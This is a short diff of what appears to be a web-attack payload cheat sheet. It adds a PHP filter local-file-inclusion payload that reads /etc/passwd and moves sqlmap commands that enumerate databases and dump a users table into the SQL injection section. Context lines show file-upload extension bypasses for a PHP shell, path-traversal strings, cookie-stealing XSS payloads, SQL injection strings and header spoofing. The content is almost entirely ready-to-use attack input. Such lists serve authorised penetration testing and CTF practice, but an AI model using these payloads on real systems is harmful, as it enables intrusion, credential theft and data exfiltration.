@@ -135,7 +135,8 @@ shell%2EPHP
 shell%2Ephar%00%2Epng
 shell%2Ephar%00.png
 
-[*] Traversal
+[*] LFI
+index.php?page=php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd
 ..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
 ..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
 GET /image?filename=/var/www/images/../../../etc/passwd
@@ -156,6 +157,10 @@ javascript:alert(document.cookie)
 <iframe src="https://$TARGET/?search=%22%3E%3Cbody%20onresize%3Dalert%28document%2Ecookie%29%3E" onload=this.style.width='0px'>
 
 [*] SQLi
+sqlmap -r request --batch --level 3 -dbs
+sqlmap -r request --batch --level 3 -D temp_db --tables
+sqlmap -r request --batch --level 3 -D temp_db -T users --columns
+sqlmap -r request --batch --level 3 -D temp_db -T users --columns --dump
 ' OR 1=1 -- #
 OR 1=1 -- #
 AND 1=1 -- #
@@ -217,12 +222,6 @@ PATCH
 
 [*] Headers
 X-Forwarded-For: 1
-
-[*] sqlmap
-sqlmap -r request --batch --level 3 -dbs
-sqlmap -r request --batch --level 3 -D temp_db --tables
-sqlmap -r request --batch --level 3 -D temp_db -T users --columns
-sqlmap -r request --batch --level 3 -D temp_db -T users --columns --dump
 
 [*] XXE
 <?xml version="1.0" encoding="UTF-8"?>
